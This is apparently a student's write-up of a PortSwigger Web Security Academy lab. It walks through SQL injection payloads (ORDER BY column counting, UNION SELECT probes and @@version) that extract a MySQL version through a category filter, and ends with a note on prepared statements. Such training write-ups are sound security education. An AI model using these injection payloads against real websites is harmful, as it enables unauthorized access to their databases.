# Lab 04: SQL Injection – Querying Database Version on MySQL and Microsoft

## Lab Information
- **Platform:** PortSwigger Web Security Academy
- **Category:** SQL Injection
- **Difficulty:** Apprentice
- **Status:** Solved ✅
- **Database:** MySQL

## Objective
Retrieve the database version using a SQL injection vulnerability in the category filter.

## Steps Taken

### 1. Intercepted the Request
I opened the Gifts category and intercepted this request using Burp Suite:

```http
GET /filter?category=Gifts HTTP/2
```

### 2. Identified the Number of Columns

I tested these payloads:

```sql
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
```

The first two worked, but the third caused an error.

**Conclusion:** The original query contains two columns.

### 3. Tested UNION SELECT

I tested:

```sql
' UNION SELECT NULL,NULL-- 
```

The request worked successfully.

### 4. Identified a Text-Compatible Column

I tested:

```sql
' UNION SELECT 'hello',NULL-- 
```

Then:

```sql
' UNION SELECT NULL,'hello'-- 
```

The second column displayed the word `hello`.

**Conclusion:** The second column accepts and displays text.

### 5. Retrieved the Database Version

I used:

```sql
' UNION SELECT NULL,@@version-- 
```

The response revealed the MySQL database version:

```text
8.0.42-0ubuntu0.20.04.1
```

## Important Concepts Learned

- `ORDER BY`: Identifies the number of columns.
- `UNION SELECT`: Combines results from another SELECT query.
- `NULL`: Provides a placeholder for a column.
- `@@version`: Retrieves the MySQL database version.
- `-- `: Comments out the remaining SQL query in MySQL when followed by whitespace.

## Tools Used
- Burp Suite Community Edition
- Kali Linux
- PortSwigger Web Security Academy

## Prevention
Developers should use parameterized queries (prepared statements) instead of directly inserting user input into SQL queries.

## Result
<mark>Congratulations! Lab successfully solved.</mark>
